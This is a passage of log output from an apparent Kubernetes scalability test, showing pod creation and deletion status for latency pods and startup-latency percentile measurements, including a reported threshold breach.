\u0026#34;Creating saturation pods\u0026#34; ended I1214 15:48:52.631261 129068 pod_startup_latency.go:131] PodStartupLatency: labelSelector(group = latency): starting pod startup latency measurement... I1214 15:48:52.731639 129068 wait_for_controlled_pods.go:163] WaitForControlledPodsRunning: starting wait for controlled pods measurement... I1214 15:48:56.854842 129068 wait_for_controlled_pods.go:196] WaitForControlledPodsRunning: waiting for controlled pods measurement... I1214 15:48:57.893711 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-0): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:58.090743 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-1): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:58.290905 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-2): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:58.489711 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-3): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:58.690296 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-4): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:58.889999 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-5): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:59.089820 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-6): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:59.289666 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-7): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:59.490967 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-8): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:59.690953 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-9): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:48:59.892106 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-0): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:00.093290 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-1): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:00.296933 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-2): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:00.498491 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-3): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:00.700027 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-4): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:00.963786 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-5): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:01.107629 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-6): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:01.311728 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-7): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:01.509745 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-8): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:01.710317 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-9): Pods: 1 out of 1 created, 0 running, 1 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:02.893967 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-0): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:03.090943 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-1): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:03.290972 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-2): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:03.490268 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-3): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:03.690609 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-4): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:03.890985 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-5): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:04.090049 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-6): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:04.290203 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-7): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:04.691160 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-9): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:05.093608 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-1): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:05.499007 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-3): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:05.964020 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-5): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:06.312641 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-7): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:06.710758 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-9): Pods: 1 out of 1 created, 1 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:06.710803 129068 wait_for_controlled_pods.go:235] WaitForControlledPodsRunning: running 20, deleted 0, timeout: 0, unknown: 0 I1214 15:49:06.715769 129068 wait_for_controlled_pods.go:249] WaitForControlledPodsRunning: 20/20 ReplicationControllers are running with all pods I1214 15:49:06.720533 129068 simple_test_executor.go:128] Step \u0026#34;Creating latency pods\u0026#34; ended I1214 15:49:10.750656 129068 wait_for_controlled_pods.go:196] WaitForControlledPodsRunning: waiting for controlled pods measurement... I1214 15:49:11.801519 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-0): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:11.986805 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-1): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:12.184772 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-2): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:12.382919 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-3): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:12.589442 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-4): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:12.785810 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-5): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:12.983926 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-6): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:13.184330 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-7): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:13.384069 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-8): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:13.586112 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-9): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:13.790252 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-0): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:13.987269 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-1): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:14.192313 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-2): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:14.397369 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-3): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:14.605276 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-4): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:14.798794 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-5): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:14.997796 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-6): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:15.209917 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-7): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:15.394405 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-8): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:15.594518 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-9): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:17.184991 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-2): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:17.383303 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-3): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:17.786423 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-5): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:17.984309 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-6): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:18.184626 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-7): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:18.586402 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-9): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:18.987494 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-1): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:19.397720 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-3): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:19.799365 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-5): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:20.210268 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-7): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:20.594992 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=latency-pod-rc-9): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:22.984472 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-6): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:23.587181 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=latency-pod-rc-9): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 0 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:23.587247 129068 wait_for_controlled_pods.go:235] WaitForControlledPodsRunning: running 0, deleted 20, timeout: 0, unknown: 0 I1214 15:49:23.587289 129068 wait_for_controlled_pods.go:249] WaitForControlledPodsRunning: 0/0 ReplicationControllers are running with all pods I1214 15:49:23.612305 129068 pod_startup_latency.go:163] PodStartupLatency: labelSelector(group = latency): gathering pod startup latency measurement... I1214 15:49:23.650456 129068 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = latency): 20 worst create-to-schedule latencies: [{test-tteu8b-1/latency-pod-rc-0-lnrtg node2 0s} {test-tteu8b-1/latency-pod-rc-7-646cq node2 0s} {test-tteu8b-2/latency-pod-rc-4-tbszn node1 0s} {test-tteu8b-1/latency-pod-rc-5-mjbsr node2 0s} {test-tteu8b-1/latency-pod-rc-3-42gdw node2 0s} {test-tteu8b-2/latency-pod-rc-7-c7rst node2 0s} {test-tteu8b-1/latency-pod-rc-4-ngh2t node2 0s} {test-tteu8b-2/latency-pod-rc-1-4j655 node2 0s} {test-tteu8b-2/latency-pod-rc-9-xmct4 node2 0s} {test-tteu8b-1/latency-pod-rc-1-nk24t node2 0s} {test-tteu8b-1/latency-pod-rc-2-rj7h5 node2 0s} {test-tteu8b-1/latency-pod-rc-9-ww659 node2 0s} {test-tteu8b-2/latency-pod-rc-3-k8g85 node2 0s} {test-tteu8b-2/latency-pod-rc-0-wdhxz node1 0s} {test-tteu8b-2/latency-pod-rc-2-pwgsb node1 0s} {test-tteu8b-2/latency-pod-rc-8-c5m4q node1 0s} {test-tteu8b-2/latency-pod-rc-6-x7d4t node1 0s} {test-tteu8b-1/latency-pod-rc-8-4kx24 node1 0s} {test-tteu8b-1/latency-pod-rc-6-wskwq node2 0s} {test-tteu8b-2/latency-pod-rc-5-xx7qn node2 1s}] I1214 15:49:23.650562 129068 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = latency): perc50: 0s, perc90: 0s, perc99: 1s; threshold: 5s I1214 15:49:23.650571 129068 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = latency): 20 worst schedule-to-run latencies: [{test-tteu8b-1/latency-pod-rc-8-4kx24 node1 1s} {test-tteu8b-2/latency-pod-rc-2-pwgsb node1 1s} {test-tteu8b-2/latency-pod-rc-0-wdhxz node1 2s} {test-tteu8b-2/latency-pod-rc-6-x7d4t node1 2s} {test-tteu8b-2/latency-pod-rc-4-tbszn node1 2s} {test-tteu8b-2/latency-pod-rc-8-c5m4q node1 2s} {test-tteu8b-1/latency-pod-rc-0-lnrtg node2 3s} {test-tteu8b-1/latency-pod-rc-1-nk24t node2 3s} {test-tteu8b-2/latency-pod-rc-5-xx7qn node2 4s} {test-tteu8b-2/latency-pod-rc-9-xmct4 node2 4s} {test-tteu8b-1/latency-pod-rc-3-42gdw node2 4s} {test-tteu8b-2/latency-pod-rc-7-c7rst node2 4s} {test-tteu8b-1/latency-pod-rc-2-rj7h5 node2 4s} {test-tteu8b-1/latency-pod-rc-6-wskwq node2 4s} {test-tteu8b-1/latency-pod-rc-9-ww659 node2 5s} {test-tteu8b-2/latency-pod-rc-1-4j655 node2 5s} {test-tteu8b-1/latency-pod-rc-4-ngh2t node2 5s} {test-tteu8b-1/latency-pod-rc-5-mjbsr node2 5s} {test-tteu8b-1/latency-pod-rc-7-646cq node2 5s} {test-tteu8b-2/latency-pod-rc-3-k8g85 node2 5s}] I1214 15:49:23.650585 129068 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = latency): perc50: 4s, perc90: 5s, perc99: 5s; threshold: 5s I1214 15:49:23.650588 129068 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = latency): 20 worst run-to-watch latencies: [{test-tteu8b-2/latency-pod-rc-1-4j655 node2 560.606582ms} {test-tteu8b-2/latency-pod-rc-0-wdhxz node1 721.939052ms} {test-tteu8b-2/latency-pod-rc-8-c5m4q node1 833.924156ms} {test-tteu8b-2/latency-pod-rc-6-x7d4t node1 854.39232ms} {test-tteu8b-1/latency-pod-rc-5-mjbsr node2 1.012828114s} {test-tteu8b-2/latency-pod-rc-5-xx7qn node2 1.411960877s} {test-tteu8b-1/latency-pod-rc-7-646cq node2 1.647809261s} {test-tteu8b-2/latency-pod-rc-3-k8g85 node2 1.812513167s} {test-tteu8b-2/latency-pod-rc-2-pwgsb node1 1.832899011s} {test-tteu8b-2/latency-pod-rc-4-tbszn node1 1.865941757s} {test-tteu8b-1/latency-pod-rc-9-ww659 node2 2.009388509s} {test-tteu8b-1/latency-pod-rc-2-rj7h5 node2 2.082626218s} {test-tteu8b-1/latency-pod-rc-4-ngh2t node2 2.140752308s} {test-tteu8b-2/latency-pod-rc-9-xmct4 node2 2.210054751s} {test-tteu8b-1/latency-pod-rc-8-4kx24 node1 2.508582695s} {test-tteu8b-2/latency-pod-rc-7-c7rst node2 2.611408502s} {test-tteu8b-1/latency-pod-rc-6-wskwq node2 2.625719954s} {test-tteu8b-1/latency-pod-rc-1-nk24t node2 3.066876643s} {test-tteu8b-1/latency-pod-rc-3-42gdw node2 3.538575976s} {test-tteu8b-1/latency-pod-rc-0-lnrtg node2 5.586231683s}] I1214 15:49:23.650601 129068 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = latency): perc50: 1.865941757s, perc90: 3.066876643s, perc99: 5.586231683s; threshold: 5s I1214 15:49:23.650604 129068 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = latency): 20 worst schedule-to-watch latencies: [{test-tteu8b-2/latency-pod-rc-0-wdhxz node1 2.721939052s} {test-tteu8b-2/latency-pod-rc-2-pwgsb node1 2.832899011s} {test-tteu8b-2/latency-pod-rc-8-c5m4q node1 2.833924156s} {test-tteu8b-2/latency-pod-rc-6-x7d4t node1 2.85439232s} {test-tteu8b-1/latency-pod-rc-8-4kx24 node1 3.508582695s} {test-tteu8b-2/latency-pod-rc-4-tbszn node1 3.865941757s} {test-tteu8b-2/latency-pod-rc-5-xx7qn node2 5.411960877s} {test-tteu8b-2/latency-pod-rc-1-4j655 node2 5.560606582s} {test-tteu8b-1/latency-pod-rc-5-mjbsr node2 6.012828114s} {test-tteu8b-1/latency-pod-rc-1-nk24t node2 6.066876643s} {test-tteu8b-1/latency-pod-rc-2-rj7h5 node2 6.082626218s} {test-tteu8b-2/latency-pod-rc-9-xmct4 node2 6.210054751s} {test-tteu8b-2/latency-pod-rc-7-c7rst node2 6.611408502s} {test-tteu8b-1/latency-pod-rc-6-wskwq node2 6.625719954s} {test-tteu8b-1/latency-pod-rc-7-646cq node2 6.647809261s} {test-tteu8b-2/latency-pod-rc-3-k8g85 node2 6.812513167s} {test-tteu8b-1/latency-pod-rc-9-ww659 node2 7.009388509s} {test-tteu8b-1/latency-pod-rc-4-ngh2t node2 7.140752308s} {test-tteu8b-1/latency-pod-rc-3-42gdw node2 7.538575976s} {test-tteu8b-1/latency-pod-rc-0-lnrtg node2 8.586231683s}] I1214 15:49:23.650616 129068 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = latency): perc50: 6.066876643s, perc90: 7.140752308s, perc99: 8.586231683s; threshold: 5s I1214 15:49:23.650620 129068 pod_startup_latency.go:312] PodStartupLatency: labelSelector(group = latency): 20 worst e2e latencies: [{test-tteu8b-2/latency-pod-rc-0-wdhxz node1 2.721939052s} {test-tteu8b-2/latency-pod-rc-2-pwgsb node1 2.832899011s} {test-tteu8b-2/latency-pod-rc-8-c5m4q node1 2.833924156s} {test-tteu8b-2/latency-pod-rc-6-x7d4t node1 2.85439232s} {test-tteu8b-1/latency-pod-rc-8-4kx24 node1 3.508582695s} {test-tteu8b-2/latency-pod-rc-4-tbszn node1 3.865941757s} {test-tteu8b-2/latency-pod-rc-1-4j655 node2 5.560606582s} {test-tteu8b-1/latency-pod-rc-5-mjbsr node2 6.012828114s} {test-tteu8b-1/latency-pod-rc-1-nk24t node2 6.066876643s} {test-tteu8b-1/latency-pod-rc-2-rj7h5 node2 6.082626218s} {test-tteu8b-2/latency-pod-rc-9-xmct4 node2 6.210054751s} {test-tteu8b-2/latency-pod-rc-5-xx7qn node2 6.411960877s} {test-tteu8b-2/latency-pod-rc-7-c7rst node2 6.611408502s} {test-tteu8b-1/latency-pod-rc-6-wskwq node2 6.625719954s} {test-tteu8b-1/latency-pod-rc-7-646cq node2 6.647809261s} {test-tteu8b-2/latency-pod-rc-3-k8g85 node2 6.812513167s} {test-tteu8b-1/latency-pod-rc-9-ww659 node2 7.009388509s} {test-tteu8b-1/latency-pod-rc-4-ngh2t node2 7.140752308s} {test-tteu8b-1/latency-pod-rc-3-42gdw node2 7.538575976s} {test-tteu8b-1/latency-pod-rc-0-lnrtg node2 8.586231683s}] I1214 15:49:23.650631 129068 pod_startup_latency.go:313] PodStartupLatency: labelSelector(group = latency): perc50: 6.082626218s, perc90: 7.140752308s, perc99: 8.586231683s; threshold: 5s E1214 15:49:23.651429 129068 pod_startup_latency.go:243] PodStartupLatency: labelSelector(group = latency): pod startup: too high latency 50th percentile: 6.082626218s I1214 15:49:23.651671 129068 simple_test_executor.go:128] Step \u0026#34;Deleting latancy pods\u0026#34; ended I1214 15:49:24.054984 129068 wait_for_controlled_pods.go:196] WaitForControlledPodsRunning: waiting for controlled pods measurement... I1214 15:49:28.720087 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-1), labelSelector(name=saturation-rc-0): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not scheduled, 0 inactive, 1 terminating, 0 unknown, 0 runningButNotReady I1214 15:49:28.910121 129068 wait_for_pods.go:141] WaitForControlledPodsRunning: namespace(test-tteu8b-2), labelSelector(name=saturation-rc-0): Pods: 0 out of 0 created, 0 running, 0 pending scheduled, 0 not 